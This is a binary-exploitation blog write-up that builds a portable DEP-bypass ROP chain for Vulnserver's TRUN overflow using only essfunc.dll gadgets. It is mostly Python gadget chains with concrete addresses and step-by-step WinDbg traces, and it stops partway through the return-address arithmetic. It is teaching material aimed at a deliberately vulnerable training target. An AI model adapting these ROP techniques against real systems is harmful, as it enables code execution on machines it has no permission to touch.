---
layout: post
title: Vulnserver - Portable DEP Bypass
tags: [Research, RE, Binary Exploitation]
author: mqt @ Ingredous Labs
comment: true
---

## Preface

While searching online for a `Vulnserver TRUN Overflow` proof-of-concept capable of circumventing `DEP`, all the available examples seemed to utilize `Mona` to construct the `ROP` chain, drawing gadgets from multiple modules with the majority (if not all) being system libraries.

The challenge here lies in the fragile nature of the `ROP` chain when relying on system libraries. Since 2007, Windows system libraries are compiled with `ASLR`, making their memory addresses unpredictable. What complicates this is that the base addresses for these libraries are set when the system boots up. So, if you're using hardcoded addresses from these libraries in your `ROP` chain, your exploit will fail if the target system restarts.

Furthermore, even if you somehow manage to sidestep the `ASLR` issue, you'll still be tied down to a specific Windows version. System libraries are often updated or changed between different versions of the OS. So, the gadgets you rely on today might not be available or could be located at different addresses in a future Windows update. This lack of adaptability limits the usefulness of your exploit across different environments.

Lastly in a real-world scenario, you won't have the luxury of knowing the hardcoded memory addresses of gadgets residing in system libraries on a remote target system. This makes the hardcoded addresses practically useless for bypassing `DEP` in remote exploitation scenarios. As a result, your `ROP` chain ends up being effective only for local exploitation, severely limiting its practical utility.

What's the solution? On paper, it's straightforward: construct the `ROP` chain using gadgets from the libraries bundled with the application. But as we'll discover, executing this solution is far from simple.

## Building the ROP Chain

**Note: The `Exploit Protection` settings on `Windows 10` were modifed to enable `DEP` for the `Vulnsever.exe` process.**

After booting up `Windbg` and attaching to `Vulnserver.exe`, the modules loaded in the process are shown below along with their memory protections:

```text
0:000> !nmod
00400000 0041d000 vulnserver           /SafeSEH OFF                C:\Users\m\Desktop\vulnserver\vulnserver.exe
62500000 6251b000 essfunc              /SafeSEH OFF                C:\Users\m\Desktop\vulnserver\essfunc.dll
75030000 75268000 KERNELBASE           /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNELBASE.dll
75a60000 75b1f000 msvcrt               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\msvcrt.dll
76520000 765ba000 KERNEL32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNEL32.DLL
76820000 76883000 WS2_32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\WS2_32.dll
76d80000 76e45000 RPCRT4               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\RPCRT4.dll
76ed0000 7706f000 ntdll                /SafeSEH ON  /GS *ASLR *DEP ntdll.dll
```

In the case of `Vulnserver`, there are only two modules which are not system libraries:

- vulnserver (base executable)
- essfunc (library)

Moreover, the situation is complicated by the fact that the memory regions of the `vulnserver` module start with `0x00`. In the context of this application, a null-byte is considered a 'bad character'. This effectively renders any gadgets within the `vulnserver` module unusable. Even if you manage to use a 'partial overwrite', you could only use a single gadget successfully; all subsequent gadgets would get truncated due to the null-byte issue. This leaves us with the `essfunc` module as our sole source for usable gadgets.

An added advantage of the `essfunc` module is its uncommon preferred base address, which is `0x62500000`. This is significant because the default base address on `x86` for a DLL is usually `0x10000000`. If multiple libraries in the application used this default, there's a good chance their addresses would conflict. In that case, Windows would resolve the clash by assigning an available base address, essentially randomizing it. With the `essfunc` module's unique base address, we sidestep this issue.

### Determining the API to use to bypass DEP

Several functions exist for bypassing `DEP`, with the most commonly used ones being `VirtualAlloc`, `VirtualProtect`, and `WriteProcessMemory`. Upon inspecting the imported functions in `esssfunc.dll`, we find that it includes `VirtualProtect`. This makes it our go-to function for bypassing `DEP`.

For context, the `VirtualProtect` function prototype is the following:

```cpp
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

### Preserving the Stack

When creating a `ROP` chain, one of the initial steps usually involves saving the stack's address in a register. This is important because often a 'skeleton' is part of the buffer, serving as a blueprint to set up a `VirtualProtect` call. The skeleton typically looks like this:

```python
skeleton = b''
skeleton += struct.pack('I', 0x45454545) # VirtualProtect address
skeleton += struct.pack('I', 0x46464646) # ret address
skeleton += struct.pack('I', 0x47474747) # lpAddress 
skeleton += struct.pack('I', 0x48484848) # dwsize (0x01)
skeleton += struct.pack('I', 0x49494949) # flNewProtect (0x40)
skeleton += struct.pack('I', 0x4a4a4a4a) # lpflOldProtect (ptr to valid memory location)
```

In order to preserve the `ESP` register, you will find common gadgets such as:

```text
push esp ; pop r32 ; ret
```

```text
mov r32, esp ; ret
```

```text
// assuming that r32 is 0x00
or r32, esp ; ret
```

```text
// assuming that r32 is 0xFFFFFFF
and r32, esp
```

```text
// asuming that r32 is 0x00
add r32, esp ; ret
```

```text
// assuming that r32 is 0x00
sub esp, r32
neg r32
ret
```

In this specific scenario, however, we didn't find any gadgets that would help with this. Interestingly, we did find that `EAX` is pointing to the stack, specifically, it is `0x7E0` bytes away from the stack pointer. This is advantageous as we can use the current `EAX` address to construct the `VirtualProtect` call without any interference from the other gadgets. Although it's possible to place the skeleton shown above on the stack and reach  it by adjusting `EAX` using arithmetic instructions, there's really no reason to do so.

You'll soon observe that in this specific gadget chain, `EAX` is frequently used as a transient or "scratch" register due to the nature of the gadgets. To mitigate the ephemeral nature of `EAX`, its value was persisted to `ECX` This choice was influenced by the discovery of two particularly useful gadgets. These gadgets allow `EAX` and `ECX` to essentially be interchanged between one another. These gadgets will prove valuable later in the writeup.

```text
0x625021ff: nop ; mov ecx, eax ; mov eax, ecx ; pop ebx ; pop esi ; ret 
0x6250219d: mov eax, ecx ; ret
```

### Dynamically obtaining the address of VirtualProtect

While `essfunc` isn't compiled with `ASLR`, the `VirtualProtect` function, housed in `kernel32`, is. This means that the `VirtualProtect` address will be subject to randomization. So, the puzzle here is: how do we find the address of `VirtualProtect` during runtime?

Enter the `Import Address Table (IAT)`, a powerful mechanism for tackling this issue. As one [Stack Overflow answer](https://reverseengineering.stackexchange.com/a/16872) explains:

```text
The Import Address Table consists of function pointers and is utilized to fetch function addresses when DLLs are loaded. A compiled application is engineered to use these function pointers instead of hardcoding direct addresses.
```

The great thing about an `IAT` belonging to a module without `ASLR`, like `essfunc`, is that it will contain a hardcoded pointer to `VirtualProtect`. This pointer can be easily dereferenced at runtime to acquire the actual address of the `VirtualProtect` function, sidestepping the randomization issue.

Here's a quick guide that illustrates the process:

- Open `essfunc.dll` in IDA Pro or any other disassembler of your choice. Once the binary analysis is complete, look under the `Imports` tab. Search for your desired function, and you should find an entry similar to:

```text
62507120		VirtualProtect	KERNEL32
```

The address `0x62507120` serves as the hardcoded pointer directing to the actual `VirtualProtect` address.

- Now, connect a debugger like WinDbg to `vulnserver.exe`. Use the following command to dereference the pointer and reveal the first few instructions at the address, along with the symbol name

```text
0:000> u poi(0x62507120)
KERNEL32!VirtualProtectStub:
77db5c80 8bff            mov     edi,edi
77db5c82 55              push    ebp
77db5c83 8bec            mov     ebp,esp
77db5c85 5d              pop     ebp
77db5c86 ff251888e177    jmp     dword ptr [KERNEL32!_imp__VirtualProtect (77e18818)]
```

Note that the symbol name displayed is `VirtualProtectStub`, which essentially calls `VirtualProtect` internally. This confirms that `VirtualProtect`'s address can indeed be acquired during runtime.

The in-depth explanation earlier paves the way for our hunt for a specific kind of gadget—a gadget that can dereference a `DWORD` from a memory address and move it into a register. Simply put, we're looking for something like:

```text
mov r32, [r32]
```

To expedite the search, using regular expressions can be quite handy. For example, to find a gadget similar to the one above, the following expression can be used:

```text
mov\se\w\w,\s\s\[e\w\w\]
```

The search yields two gadgets matching this pattern:

```text
0x62501e2d: lea esi,  [esi+0x00] ; mov eax,  [ebx] ; mov  [esp+0x00], eax ; call ebp 
0x62501e30: mov eax,  [ebx] ; mov  [esp+0x00], eax ; call ebp 
```

Upon closer inspection, these gadgets are actually identical, distinguished only by a leading instruction in the first one. In other words, the `mov eax, [ebx]` occurs at the same address in both aka `0x62501e30`.

Moreover, these gadgets look daunting at first, due to the mov `[esp+0x00], eax` instruction and the subsequent indirect call. When encountering challenges like this, it's advisable to look for alternative gadgets that essentially accomplish the same dereferencing goal. For example:

```text
push [eax]
pop ebx
...
ret
```

```text
xor eax, eax / sub eax, eax
add eax, [ebx]
...
ret
```

```text
xor eax, eax / sub eax, eax
or eax, [ebx]
...
ret
```

Regrettably, upon further investigation, the `essfunc` module doesn't offer such alternatives. The only viable option remains:

```text
mov eax,  [ebx] ; mov  [esp+0x00], eax ; call ebp 
```

To demystify this gadget, let's break down its individual instructions:

1. `mov eax,  [ebx]` - Dereferences a `DWORD` from `[EBX]` and moves it into `EAX`
2. `mov [esp+0x00], eax` - Overwrites the value on top of the stack with `EAX`.
3. `call ebp` - Makes an indirect call to `EBP`.

This gadget presents a set of challenges, as discussed earlier. The primary concern is that it meddles with the stack, which holds our gadget chain aiming to create a `VirtualProtect` function call. Any alteration to the stack jeopardizes this chain. Also, typical gadgets usually end with a `ret` instruction, so the program fetches the next gadget from the stack. But due to how the `call` instruction works, it alters the stack again by pushing the return address, further complicating the situation.

Surprisingly, the tricky gadget we've been analyzing could actually serve us well, provided we're able to preload an arbitrary value into `EBP`. The good news is that the `essfunc` module has an instruction like `pop ebp ; ret`, making this feasible.

Here's the fundamental outline:

Load `EBP` with an address pointing to another gadget that will remove two values from the top of the stack—essentially a `pop/pop/ret` sequence:
 1. `pop r32` - Clears the return address that was pushed by the `call` operation.
 2. `pop r32` - Clears the value written onto the stack by `mov [esp+0x00], eax`.
 3. `ret` - Proceeds to the next gadget in the chain.

We're in luck again, as the `essfunc` module contains several `pop/pop/ret` instructions, such as:

```text
0x625012f6: pop edi ; pop ebp ; ret 
```

So, the sequence of gadgets would look something like this:

```python
rop += struct.pack('<L', 0x625012f7) # pop ebp ret
rop += struct.pack('<L', 0x625012f6) # pop edi ; pop ebp ; ret
rop += struct.pack('<L', 0x6250103d) # pop ebx ; ret
rop += struct.pack('<L', 0x62507120) # VirtualProtect IAT
rop += struct.pack('<L', 0x62501e30) # mov eax,  [ebx] ; mov  [esp+0x00], eax ; call ebp
rop += struct.pack('<L', 0x42424242) # junk to be overwritten by [esp + 0x00]
rop += struct.pack('<L', 0x62501d08) # ! int3 (breakpoint instruction) 
```

After incorporating this gadget chain into the proof-of-concept buffer, it's behavior can be observed in the debugger. At the first breakpoint:

```text
Breakpoint 0 hit
...
essfunc+0x12f7:
625012f7 5d              pop     ebp
```

Upon stepping over, `EBP` now points to the `pop/pop/ret` gadget:

```text
0:003> u ebp L3
essfunc+0x12f6:
625012f6 5f              pop     edi
625012f7 5d              pop     ebp
625012f8 c3              ret
```

The next gadget: `pop ebx ; ret` loads the `IAT` entry address of `VirtualProtect` into `EBX`, which is confirmed by stepping over it:

```text
0:003> r ebx
ebx=62507120
```

Next, the critical instruction that dereferences the DWORD from `EBX` into `EAX`:

```text
62501e30 8b03            mov     eax,dword ptr [ebx] 
```

Stepping over it confirms that `EAX` now holds the address of the `VirtualProtect` stub:

```text
0:003> u eax
KERNEL32!VirtualProtectStub:
77db5c80 8bff            mov     edi,edi
77db5c82 55              push    ebp
77db5c83 8bec            mov     ebp,esp
77db5c85 5d              pop     ebp
77db5c86 ff251888e177    jmp     dword ptr [KERNEL32!_imp__VirtualProtect (77e18818)]
```

Now comes the problematic instruction:

```text
62501e32 890424          mov     dword ptr [esp],eax
```

Let's verify that the stack value to be overwritten is the placeholder value that was included in the chain for this specific purpose:

```text
0:003> dd esp L1
00e9fa18  42424242
```

Finally, the make-or-break instruction:

```text
62501e35 ffd5            call    ebp
```

Stepping into the call and examining the stack reveals:

```text
0:003> dd esp L3
00e9fa14  62501e37 77db5c80 62501d08
```

The first address aka `0x62501e37` is the return address in which the `call ebp` instruction pushed onto the stack. Following that `0x77db5c80` is the address of the `VirtualProtect` stub which made it onto the stack due to the `mov  [esp+0x00], eax` instruction. Finally `0x62501d08` is the next gadget in our chain that we would like to reach.

As we step through the `pop/pop/ret` instructions, the stack realigns perfectly:

```text
625012f6 5f   pop edi  -> pops 0x62501e37 into EDI
625012f7 5d   pop ebp  -> pops 0x77db5c80 into EBP
625012f8 c3   ret      -> returns to 0x62501d08
```

In conclusion, we've successfully repurposed a gadget that, under most other circumstances, would have been unsuitable. It now effectively achieves the targeted action of dereferencing a pointer into a register.

### Overriding the first placeholder

After successfully obtaining the runtime address of the `VirtualProtect` stub, the next objective is to weave this into the 'skeleton' that will invoke the `VirtualProtect` call. 

Here's a quick refresher on how the 'skeleton' is structured:

```text
- VirtualProtect Address
- Return Address // start of shellcode address
- lpAddress // start of shellcode (same as above)
- dwSize // 0x01
- flNewProtect // 0x1000
- lpflOldProtect // any valid arbitrary pointer
```

Our next hurdle involves finding a gadget that performs the opposite of the one we've just discussed—specifically, moving a `DWORD` into a pointer, in other words:

```
mov [r32], r32
```

The two involved registers must be different in this case. The source register should contain the `VirtualProtect` address, while the destination register will point to the beginning of the skeleton.

To expedite the gadget search, using a regular expression like the one below can be helpful:

```text
mov\s\s\[e\w\w\],\se\w\w
```

This query yields four gadgets that match:

```text
0x62501ea0: and al, 0x20 ; mov  [esp+0x00], 0x62505388 ; mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]
0x62501ea9: mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC] 
0x62501ea2: mov  [esp+0x00], 0x62505388 ; mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]
0x62501e9e: mov eax,  [esp+0x20] ; mov  [esp+0x00], 0x62505388 ; mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]
```

Upon closer inspection, these gadgets turn out to be variations of the same core instruction set, all containing `mov [ebx], eax` at the same address `0x62501ea9`. Unfortunately, these gadgets seem problematic, particularly due to the call to a seemingly arbitrary pointer.

In scenarios where a gadget might introduce unintended effects—such as an arbitrary call instruction—it’s wise to search for alternative options, like:

```text
push eax
pop [ebx]
...
ret
```

Note: There are a few more esoteric gadgets that can achieve the behavior however they rely on the first `DWORD` of the pointing referenced by the destination register to be `0x00`.

Despite the search, no suitable alternatives were discovered, leaving us with the initial problematic gadget:

```text
mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC] 
```

So, the pressing question is, how to handle the `call [0x625070DC]` instruction? Fortunately, since `ASLR` is not enabled on this module, and given the unique preferred base address, the pointer at `0x625070DC` will be valid every time `essfunc.dll` is loaded into memory.

By leveraging the approach we took in the previous challenge, we can manipulate the memory in a way that makes the pointer at `0x625070DC` point to a gadget simulating a `ret` instruction. Just like we saw before, invoking a `call` instruction will push the subsequent instruction's address onto the stack to act as a return address. The gadget we choose must then execute this specific sequence:

```text
pop r32 // pop return address into scratch register
ret
```

So, how do we modify the pointer to direct to this gadget? We employ a slight variation of the pattern we used before:

```text
pop r32 ; ret
0x625070DC
// r32 now holds the pointer

pop r32; ret (different register than the earlier one)
0x12345678
// pop address of gadget that will perform pop/ret intruction (can be the same address of the pop r32; ret gadget 
```

Curiously, we find ourselves back at the initial issue - we need a gadget capable of storing a `DWORD` into a pointer. In a rather meta-ironic twist, we'll use the same gadget that we're attempting to manipulate:

```text
mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC] 
```

This results in the following sequence of gadgets: 

```python
rop += struct.pack('<L', 0x625014fc) # pop ebx ; ret
rop += struct.pack('<L', 0x625070DC) # ebx will be 0x625070DC 
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret
rop += struct.pack('<L', 0x625012f7) # pop ebp; ret
rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]
```

Incorporating this into the proof of concept, we can step through the debugger to get a btter understanding of what is happening.

The first executed instruction is `pop ebx ; ret`. Skipping past this instruction reveals that `EBX` holds the pointer's address:

```text
0:004> r @ebx
ebx=625070dc
```

Next, we encounter `pop eax ; ret`. Stepping over this shows that `EAX` now holds another gadget's address, namely `pop ebp ; ret`:

```text
0:004> u eax
essfunc+0x12f7:
625012f7 5d              pop     ebp
625012f8 c3              ret
```

The upcoming instruction is the very gadget we've been diligently searching for:

```text
62501ea9 8903  mov  dword ptr [ebx],eax 
```

After stepping over it, lets examine the first `DWORD` referenced by `[EBX]`:

```text
0:004> u poi(ebx)
essfunc+0x12f7:
625012f7 5d              pop     ebp
625012f8 c3              ret
```

It now houses the `pop r32; ret gadget`!

The subsequent instruction seems complex, but is actually innocuous. It simply overwrites `EAX` with a `DWORD` from `[ESP + 0x24]`:

```text
62501eab 8b442424 mov eax,dword ptr [esp+24h]
```

In our scenario, this is harmless, but it does mean `EAX` must be considered a scratch register (circling back to what was alluded near the beginning of the writeup).

The next executed instruction, `mov dword ptr [ebx+4],eax`, changes the second `DWORD` pointed to by `EBX`, but this is inconsequential.

Finally, we arrive at the much-anticipated `call [0x625070DC]` instruction, let's observe the instruction right after the `call` and then step into the `call` to see its inner workings:

```text
0:004> u eip L2
essfunc!EssentialFunc14+0x8e8:
62501eb2 ff15dc705062    call    dword ptr [essfunc!EssentialFunc14+0x5b12 (625070dc)]
62501eb8 a180535062      mov     eax,dword ptr [essfunc!EssentialFunc14+0x3db6 (62505380)]

0:004> t

0:004> dds esp L2
0103fa14  62501eb8 essfunc!EssentialFunc14+0x8ee  <---- return address of the instruction after the call
0103fa18  62501d08 essfunc!EssentialFunc14+0x73e  <---- address of the next gadget in the chain

625012f7 5d   pop ebp

0:004> t
// EBP clears 0x62501eb8 from the stack

625012f8 c3   ret

0:004> dd esp L1
0103fa18  62501d08
```

As clearly displayed, at the time of executing the `ret` instruction, the address on top of the stack points to next instruction in the gadget chain, therefore demonstrating that usually discarded gadget was repurposed into something useful.

#### Quick Detour

Before delving deeper into overriding the first placeholder of the `VirtualProtect` skeleton with the address of the `VirtualProtect` stub, we need to address an issue. The beginning of the gadget indicates that for the `mov [ebx], eax instruction` to execute, `EBX` must possess the pointer pointing to the start of the `VirtualProtect` skeleton. Currently, only `EAX` and `ECX` have this pointer. As highlighted earlier, the initial `EAX` pointer was stored in `ECX` because `EAX` would act as a scratch register. This situation now becomes pivotal.

We can identify several gadgets to transfer the value from `EAX/ECX` to `EBX`, with `r32` representing either `EAX` or `ECX`:

```text
mov ebx, r32
...
ret
```

```text
push r32
pop ebx
...
ret
```

```text
xchg r32, ebx / xchg ebx, r32
...
ret
```

```text
xor ebx, ebx / sub ebx, ebx
add ebx, r32
...
ret
```

```text
xor ebx, ebx / sub ebx, ebx
or ebx, r32
...
ret
```

```text
mov ebx, 0xFFFFFFFF
and ebx, r32
...
ret
```

But we face a challenge. What's intriguing about `ROP` chains are the unexpected outcomes some gadgets yield. Here's an illustrative example:

A unique gadget found appears unproductive initially but is crucial:


```text
0x62501a9d: mov  [esp+0x00], eax ; call  [0x62507124]
```

Let's breakdown the gadget to better understand what it does:

- `mov  [esp+0x00], eax` - Overwrites the top of the stack with the value of `EAX`.
- `call  [0x62507124]`   - Makes a call to the address in which `0x62507124` is pointing to.

While individually they might seem unimpressive, their combined effect in the gadget is potent.

To grasp its function, we'll navigate through a debugger using a specified sequence of gadgets. Here's how the sequence of gadget currently appears:

```python
rop = b''
# 0. preserve location of VirtualProtect skeleton in ECX
rop += struct.pack('<L', 0x625021ff) # nop ; mov ecx, eax ; mov eax, ecx ; pop ebx ; pop esi ; ret
rop += struct.pack('<L', 0x41414141) # junk for ebx
rop += struct.pack('<L', 0x41414141) # junk for esi
###
rop += struct.pack('<L', 0x62501a9d) # mov  [esp+0x00], eax ; call  [0x62507124]
rop += struct.pack('<L', 0x41414141) # junk will be overwritten by [esp + 0x00]
rop += struct.pack('<L', 0x62501d08) # ! int3 (breakpoint instruction) 
```

The breakpoint will be specifically set on the instruction located at `0x62501a9d`.

```text
Breakpoint 0 hit
...
essfunc!EssentialFunc14+0x4d3:
62501a9d 890424   mov dword ptr [esp],eax
```

At the current moment `EAX` points to the start of the `VirtualProtect` skeleton aka `0x011ff228`.

Stepping over the `mov dword ptr [esp],eax` instruction shows that the value on top of the stack is now `0x011ff228`:

```text
0:004> dd esp L1
010efa14  010ef228
```

The next instruction is the one which will make the call to the pointer:

```text
62501aa0 ff1524715062   call dword ptr [essfunc!EssentialFunc14+0x5b5a (62507124)]
```

Let's step into the call and observe the stack:

```text
0:004> dds esp L3
010efa10  62501aa6  // return address pushed via the call instruction
010efa14  011ff228  // EAX (pointer to VirtualProtect skeleton)
010efa18  62501d08  // address of next gadget in chain
```

So in order to get the value on the stack into `EBX` and return to the next gadget in the chain, we need to find a gadget which does the following:

```text
pop r32
pop ebx
ret
```

Luckily, there is a gadget that makes this possible:

```text
0x625014e1: pop ebx ; pop ebx ; ret
```

This means we can modify the `0x62507124` pointer to hold the address to the gadget above. The sequence of these gadgets should be placed after those that initially modified the `0x625070DC` pointer, constructing our gadget chain:

```python
rop = b''
# 0. preserve location of VirtualProtect skeleton in ECX
rop += struct.pack('<L', 0x625021ff) # nop ; mov ecx, eax ; mov eax, ecx ; pop ebx ; pop esi ; ret
rop += struct.pack('<L', 0x41414141) # junk for ebx
rop += struct.pack('<L', 0x41414141) # junk for esi
# ECX now holds pointer to VirtualProtect skeleton

# 1. override 0x625070DC to hold address of pop r32 ; ret gadget
rop += struct.pack('<L', 0x625014fc) # pop ebx ; ret
rop += struct.pack('<L', 0x625070DC) # ebx will be 0x625070DC 
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret
rop += struct.pack('<L', 0x625012f7) # pop ebp; ret
rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]

# 2. override 0x62507124 to hold address of pop r32 ; pop ebx ; ret gadget
rop += struct.pack('<L', 0x625014fc) # pop ebx ; ret
rop += struct.pack('<L', 0x62507124) # ebx will be 0x62507124 
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret
rop += struct.pack('<L', 0x625014e1) # address of pop ebx ; pop ebx ; ret
# EAX now holds address of pop ebx ; pop ebx ; ret
rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]
```

However there is a slight problem, `EAX` gets mangled throughout these sequence of gadgets hence why we persisted the original value of `EAX` in `ECX`. Thus we can use the following gadget to restore `EAX` to its original value:

```python
rop += struct.pack('<L', 0x6250219d) # mov eax, ecx ; ret
rop += struct.pack('<L', 0x62501a9d) # mov  [esp+0x00], eax ; call  [0x62507124]
rop += struct.pack('<L', 0x41414141) # junk will be overwritten by [esp + 0x00]
rop += struct.pack('<L', 0x62501d08) # ! int3 (breakpoint instruction) 
```

Let's set a breakpoint at the address of the instruction which restores `EAX` from `ECX` aka `0x6250219d` and step through-it once again.

```text
Breakpoint 0 hit
essfunc!EssentialFunc14+0xbd3:
6250219d 89c8   mov eax,ecx
```

After this gadget is executed, `EAX` points to the start of the `VirtualProtect` skeleton once again which the address is `0x00ecf228`.

Stepping through the gadgets until the `mov  [esp+0x00], eax ; call  [0x62507124]` instruction is reached:

```text
essfunc!EssentialFunc14+0x4d3:
62501a9d 890424   mov dword ptr [esp],eax
```

After stepping over this instruction, let's examine the stack:

```text
0:003> dd esp L1
00ecfa40  00ecf228
```

As shown above, the value of `EAX` is at the top of the stack. Now let's step into the `call` instruction:

```text
essfunc!EssentialFunc14+0x4d6:
62501aa0 ff1524715062   call dword ptr [essfunc!EssentialFunc14+0x5b5a (62507124)]

0:003> t
...
essfunc!EssentialFunc3+0x7:
625014e1 5b              pop     ebx
```

Before stepping through the `pop ebx` instruction, let's examine the stack:

```text
0:003> dds esp L3
00ecfa3c  62501aa6
00ecfa40  00ecf228
00ecfa44  62501d08
```

Now the address on top of the stack is the return addresses which was placed on the stack because of the `call` instruction. Let's pop it off and re-examine the stack afterwards:

```text
essfunc!EssentialFunc3+0x8:
625014e2 5b              pop     ebx

0:003> dds esp L1
00ecfa40  00ecf228
```

The next value on top of the stack is the pointer to the `VirtualProtect` skeleton, the pointer which is held by `EAX`. After stepping through the second `pop` instruction, we can verify that `EBX` now holds this address:

```text
0:003> r @ebx
ebx=00ecf228
```

Finally we get to the `ret` instruction which will instruct the instruction pointer to return to the address which is on top of the stack:

```text
essfunc!EssentialFunc3+0x9:
625014e3 c3              ret
0:003> r @ebx

ebx=00ecf228
0:003> dds esp L1
00ecfa44  62501d08
```

As shown above, the program will proceed to the address of the subsequent gadget in the sequence, maintaining the flow of the chain!

#### Back to overriding the first placeholder

Having set `EBX` to point to the beginning of the `VirtualProtect` skeleton and adjusted the pointers to reference the addresses of gadgets that emulate specific behaviors, the next step is to replace the first `DWORD` in the skeleton with the `VirtualProtect` address. As discussed earlier, the address of `VirtualProtect` was obtained at runtime by accessing the `IAT`.

Now, let's refocus on the subsequent gadget which serves our purpose:

```text
mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC] 
```

For this to work, `EAX` should contain the address of the `VirtualProtect` stub. To fit this requirement, we'll need to restructure our gadget chain. One of the recurrent aspects of crafting `ROP` chains is this need to occasionally revisit and adjust the sequence to ensure functionality. Rarely do you build a `ROP` chain in a linear fashion from beginning to end; instead, there's often a need to skip around and return to various segments: 

As such, our gadget chain will now be the following:

```python
rop = b''
# 0. preserve location of VirtualProtect skeleton in ECX
rop += struct.pack('<L', 0x625021ff) # nop ; mov ecx, eax ; mov eax, ecx ; pop ebx ; pop esi ; ret
rop += struct.pack('<L', 0x41414141) # junk for ebx
rop += struct.pack('<L', 0x41414141) # junk for esi

# 1. override pointers with gadgets
# override 0x625070DC to hold address of pop r32 ; ret gadget
rop += struct.pack('<L', 0x625014fc) # pop ebx ; ret
rop += struct.pack('<L', 0x625070DC) # ebx will be 0x625070DC 
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret
rop += struct.pack('<L', 0x625012f7) # pop ebp; ret
rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]

# override 0x62507124 to hold address of pop r32 ; pop ebx ; ret gadget
rop += struct.pack('<L', 0x625014fc) # pop ebx ; ret
rop += struct.pack('<L', 0x62507124) # ebx will be 0x62507124 
rop += struct.pack('<L', 0x625014d5) # pop eax ; ret
rop += struct.pack('<L', 0x625014e1) # address of pop ebx ; pop ebx ; ret
# EAX now holds address of pop ebx ; pop ebx ; ret
rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]

# 2. retrieve VirtualProtect VMA and move into ESI
# 62507120		VirtualProtect	KERNEL32
rop += struct.pack('<L', 0x625012f7) # pop ebp ret
rop += struct.pack('<L', 0x625012f6) # pop edi ; pop ebp ; ret
rop += struct.pack('<L', 0x6250103d) # pop ebx ; ret
rop += struct.pack('<L', 0x62507120) # VirtualProtect IAT
rop += struct.pack('<L', 0x62501e30) # mov eax,  [ebx] ; mov  [esp+0x00], eax ; call ebp
rop += struct.pack('<L', 0x42424242) # junk to be overwritten by [esp + 0x00]
# preserve VirtualProtect VMA in ESI
rop += struct.pack('<L', 0x62501afb) # pop edi ; ret
rop += struct.pack('<L', 0x62501afb) # pop edi ; ret
rop += struct.pack('<L', 0x62501e3a) # mov esi, eax ; call edi
# * ESI now holds VirtualProtect VMA

# 3. get EBX to point to start of VirtualProtect skeleton
rop += struct.pack('<L', 0x6250219d) # mov eax, ecx ; ret
rop += struct.pack('<L', 0x62501a9d) # mov  [esp+0x00], eax ; call  [0x62507124]
rop += struct.pack('<L', 0x41414141) # junk will be overwritten by [esp + 0x00]

# 4. overwrite first placeholder with VirtualProtect VMA
rop += struct.pack('<L', 0x62502412) # mov eax, esi ; pop esi ; pop edi ; ret
rop += struct.pack('<L', 0x41414141) # junk for esi
rop += struct.pack('<L', 0x41414141) # junk for edi
rop += struct.pack('<L', 0x62501ea9) # mov  [ebx], eax ; mov eax,  [esp+0x24] ; mov  [ebx+0x04], eax ; call  [0x625070DC]  
# ! first placeholder overwritten with VirtualProtect VMA
```

### Overriding the second and third placeholders

After overwriting the initial `DWORD` in the 'skeleton' with the `VirtualProtect` address, we turn our focus to the second `DWORD`, which serves as the return address for the shellcode. This ensures that once the `VirtualProtect` call concludes, the stack will direct the application to jump to the shellcode's starting point. As you may have observed a common pattern throughout this writeup, accomplishing this is not as straightforward as it sounds.

While crafting a `ROP` chain, it's often difficult to gauge the exact number of gadgets required. Each gadget added nudges the shellcode an additional `0x04` bytes away from its original position. Due to this uncertainty, a placeholder is employed for the return address, typically set to `ESP + 0x104`. This provides a head start when the time comes to adjust the return address to align with the shellcode's starting location as only the offset that is added to the stack will need to be adjusted.

When dealing with arithmetic operations, especially addition, one might come across the following useful gadget. In our scenario, let's assume that `ECX` carries the number of bytes we wish to add, while `EAX` retains the previously preserved stack address:

```text
pop ecx ; ret        // Pop 0x104 into ECX
add ecx, eax ; ret 
// Now, ECX is 0x104 bytes further from the preserved ESP value
// Keep in mind: "add eax, ecx ; ret" is a valid alternative, but it modifies the preserved ESP value
```

However, a challenge arises in the `x86` architecture, particularly due to the way integers are represented. Integers span four bytes, and if a number doesn't occupy the entire width, it's padded with zeros. This can pose issues in applications where null-bytes disrupt string operations, a fairly common hurdle.

The behavior is evident in Ruby:

```ruby
irb(main):002:0> [0x01].pack('I')
=> "\x01\x00\x00\x00"

irb(main):004:0> [0xFFFFFFFF].pack('I')
=> "\xFF\xFF\xFF\xFF"
```

To navigate this, one could employ a neat trick: subtract the desired number from `0` thus obtaining it's two-complement. Taking `0x104` as an example:

```text
0:003> ? 0 - 0x104
Evaluate expression: -260 = fffffefc
```

